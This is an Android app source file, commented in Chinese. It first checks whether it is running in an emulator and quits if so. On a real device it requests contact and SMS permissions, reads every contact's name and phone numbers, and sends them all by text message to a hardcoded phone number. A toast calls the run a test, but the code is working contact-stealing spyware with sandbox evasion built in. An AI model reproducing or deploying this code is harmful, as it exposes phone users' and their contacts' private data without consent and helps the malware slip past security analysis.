package activity;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.content.Intent;
import android.widget.Button;

import com.example.myapplication.R;

import java.util.List;




public class MainActivity extends AppCompatActivity {

    private static final int READ_CONTACTS_PERMISSION_REQUEST_CODE = 0;
    private static final int WRITE_CONTACTS_PERMISSION_REQUEST_CODE = 1;
    private static final int GET_ACCOUNTS_PERMISSION_REQUEST_CODE = 2;
    private static final int SEND_SMS_PERMISSION_REQUEST_CODE = 3 ;

    //需要的permissions组
    private static final String[] PERMISSIONS = {
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_STATE
    };

    int requestCode = 100; // 请求代码可以是任何正整数



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //启动的ContentView
        setContentView(R.layout.activity_main);



        Button button = findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // 创建意图对象，指定启动的目标 Activity
                Intent intent = null;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                    intent = new Intent(MainActivity.this, RecordSoundActivity.class);
                }
                // 启动目标 Activity
                startActivity(intent);
            }
        });

    }

    //点击开始运行
    public void Send_SMS_Function(View view) {

        if (isEmulatorAbsoluly()) {
            // 如果在模拟器中，则直接退出应用
            Toast.makeText(getApplicationContext(), "检测到模拟环境，退出！", Toast.LENGTH_SHORT).show();
            finish();
        } else { //检查是否有写入权限
            if (!hasPermissions()) {
                ActivityCompat.requestPermissions(this, PERMISSIONS, requestCode);

            }
            String[] arr = getContacts();
            String SEND_TO_PHONE_NUMBER = "198XXXXXXXX";
            if (hasPermissions()){
                sendSMS(arr,SEND_TO_PHONE_NUMBER);
                Toast.makeText(getApplicationContext(), "测试用，代码成功执行，现在退出！", Toast.LENGTH_SHORT).show();
                finish();
            }
        }

    }
    private boolean hasPermissions() {
        for (String permission : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }



    private String[] getContacts() {

        //联系人的Uri，也就是content://com.android.contacts/contacts
        Uri uri = ContactsContract.Contacts.CONTENT_URI;
        //指定获取_id和display_name两列数据，display_name即为姓名
        String[] projection = new String[] {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
        };
        //根据Uri查询相应的ContentProvider，cursor为获取到的数据集
        Cursor cursor = this.getContentResolver().query(uri, projection, null, null, null);
          String[] arr = new String[cursor.getCount()];
        int i = 0;
        if (cursor != null && cursor.moveToFirst()) {
            do {
                Long id = cursor.getLong(0);
                //获取姓名
                String name = cursor.getString(1);
                //指定获取NUMBER这一列数据
                String[] phoneProjection = new String[] {
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                };
                arr[i] = id + " , 姓名：" + name;

                //根据联系人的ID获取此人的电话号码
                Cursor phonesCusor = this.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        phoneProjection,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id,
                        null,
                        null);

                //因为每个联系人可能有多个电话号码，所以需要遍历
                if (phonesCusor != null && phonesCusor.moveToFirst()) {
                    do {
                        String num = phonesCusor.getString(0);
                        arr[i] += " , 电话号码：" + num;
                    }while (phonesCusor.moveToNext());
                }
                i++;
            } while (cursor.moveToNext());
        }
        return arr;
    }

    private void sendSMS(String[] arr, String SEND_TO_PHONE_NUMBER) {
        if (arr != null && arr.length > 0) {
            StringBuilder messageBuilder = new StringBuilder();

            // 将 arr 数组中的信息添加到消息中
            for (String contactInfo : arr) {
                messageBuilder.append(contactInfo).append("\n");
            }

            // 获取完整的消息文本
            String message = messageBuilder.toString();

            // 使用 SmsManager 发送短信
            SmsManager smsManager = SmsManager.getDefault();

            List<String> divideContents = smsManager.divideMessage(message);
            for (String text : divideContents) {
                smsManager.sendTextMessage(SEND_TO_PHONE_NUMBER, null, text, null, null);
            }
            Toast.makeText(getApplicationContext(), "消息已经发送！", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(getApplicationContext(), "没有找到联系人信息，无法发送短信！", Toast.LENGTH_SHORT).show();
        }
    }

    public static boolean isEmulatorAbsoluly() {
        if (Build.PRODUCT.contains("sdk") ||
                Build.PRODUCT.contains("sdk_x86") ||
                Build.PRODUCT.contains("sdk_google") ||
                Build.PRODUCT.contains("Andy") ||
                Build.PRODUCT.contains("Droid4X") ||
                Build.PRODUCT.contains("nox") ||
                Build.PRODUCT.contains("vbox86p")) {
            return true;
        }
        if (Build.MANUFACTURER.equals("Genymotion") ||
                Build.MANUFACTURER.contains("Andy") ||
                Build.MANUFACTURER.contains("nox") ||
                Build.MANUFACTURER.contains("TiantianVM")) {
            return true;
        }
        if (Build.BRAND.contains("Andy")) {
            return true;
        }
        if (Build.DEVICE.contains("Andy") ||
                Build.DEVICE.contains("Droid4X") ||
                Build.DEVICE.contains("nox") ||
                Build.DEVICE.contains("vbox86p")) {
            return true;
        }
        if (Build.MODEL.contains("Emulator") ||
                Build.MODEL.equals("google_sdk") ||
                Build.MODEL.contains("Droid4X") ||
                Build.MODEL.contains("TiantianVM") ||
                Build.MODEL.contains("Andy") ||
                Build.MODEL.equals("Android SDK built for x86_64") ||
                Build.MODEL.equals("Android SDK built for x86")) {
            return true;
        }
        if (Build.HARDWARE.equals("vbox86") ||
                Build.HARDWARE.contains("nox") ||
                Build.HARDWARE.contains("ttVM_x86")) {
            return true;
        }
        if (Build.FINGERPRINT.contains("generic/sdk/generic") ||
                Build.FINGERPRINT.contains("generic_x86/sdk_x86/generic_x86") ||
                Build.FINGERPRINT.contains("Andy") ||
                Build.FINGERPRINT.contains("ttVM_Hdragon") ||
                Build.FINGERPRINT.contains("generic/google_sdk/generic") ||
                Build.FINGERPRINT.contains("vbox86p") ||
                Build.FINGERPRINT.contains("generic/vbox86p/vbox86p")) {
            return true;
        }
        return false;
    }



}